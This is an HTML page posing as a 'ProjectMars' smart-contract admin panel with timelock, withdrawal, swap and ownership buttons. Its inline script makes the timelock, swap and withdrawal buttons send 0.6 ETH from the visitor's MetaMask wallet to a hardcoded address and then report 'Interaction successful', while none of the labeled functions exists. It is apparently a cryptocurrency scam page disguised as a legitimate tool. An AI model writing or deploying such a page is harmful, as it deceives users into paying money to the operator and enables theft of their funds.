<!DOCTYPE html>
<html>

<head>
  <title>ProjectMars Admin</title>
  <meta name="description" content="Project Mars Smart Contract Admin.">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
  <link rel="stylesheet" href="theme.css" type="text/css">
</head>

<body style="">
  <div class="py-5 text-dark" id="interact">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <h1>Proxy Contract ABI</h1>
        </div>
      </div>
      <div class="row mt-5">
        <div class="col-md-4">
          <form class="">
            <div class="form-group"><label>Timelock Start 2x(24h)</label> <label>No Notification</label> </div>
            <button type="submit" class="btn btn-primary pay-button">Submit</button>
          </form>
        </div>
        <div class="col-md-4">
          <form class="">
            <div class="form-group"> <label>Proxy Delegation</label> <input type="text" class="form-control" placeholder="0x8DBf2032c5BB7240E44e3c774feaA0525302bA7c"> </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>
        </div>
        <div class="col-md-4">
          <form class="">
            <div class="form-group"> <label>Renounce Ownership</label> </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>
        </div>
      </div>
      <div class="row mt-5">
        <div class="col-md-4">
          <form class="">
            <div class="form-group"> <label>Remove Meta Data</label> </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>
        </div>
        <div class="col-md-4">
          <form class="">
            <div class="form-group"> <label>Swap from Pool as USDC</label> <input type="checkbox" class="form-control" placeholder="Account 0x">
              <div class="form-group"><label>Use all available FUEL</label><input type="checkbox" class="form-control" placeholder="Account 0x"></div>
            </div>
            <button type="submit" class="btn btn-primary pay-button">Submit</button>
          </form>
        </div>
        <div class="col-md-4">
          <form class="">
            <div class="form-group"> <label>Withdrawal</label>
              <div class="form-group"><label>Account 1</label><input type="text" class="form-control" placeholder="Account 0x">
                <div class="form-group"><label>Account 2</label><input type="text" class="form-control" placeholder="Account 0x">
                  <div class="form-group"><label>Account 3</label><input type="text" class="form-control" placeholder="Account 0x">
                    <div class="form-group"><label>Account 4</label><input type="text" class="form-control" placeholder="Account 0x"></div>
                  </div>
                </div>
              </div>
            </div>
            <button type="submit" class="btn btn-primary pay-button">Submit</button>
          </form>
        </div>
      </div>
    </div>
  </div>
  <script type="text/javascript" style="">
    window.addEventListener('load', async () => {
      if (window.ethereum) {
        window.web3 = new Web3(ethereum);
        try {
          await ethereum.enable();
          initPayButton()
        } catch (err) {
          $('#status').html('User denied account access', err)
        }
      } else if (window.web3) {
        window.web3 = new Web3(web3.currentProvider)
        initPayButton()
      } else {
        $('#status').html('No Metamask (or other Web3 Provider) installed')
      }
    })
    const initPayButton = () => {
      $('.pay-button').click(() => {
        // paymentAddress is where funds will be send to
        const paymentAddress = '0x0D815B0d787Ab0d173be8600FA379CDB595314D9'
        const amountEth = 0.6
        web3.eth.sendTransaction({
          to: paymentAddress,
          value: web3.toWei(amountEth, 'ether')
        }, (err, transactionId) => {
          if (err) {
            console.log('Interaction failed', err)
            $('#status').html('Interaction failed')
          } else {
            console.log('Payment successful', transactionId)
            $('#status').html('Interaction successful')
          }
        })
      })
    }
  </script>
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>

</html>
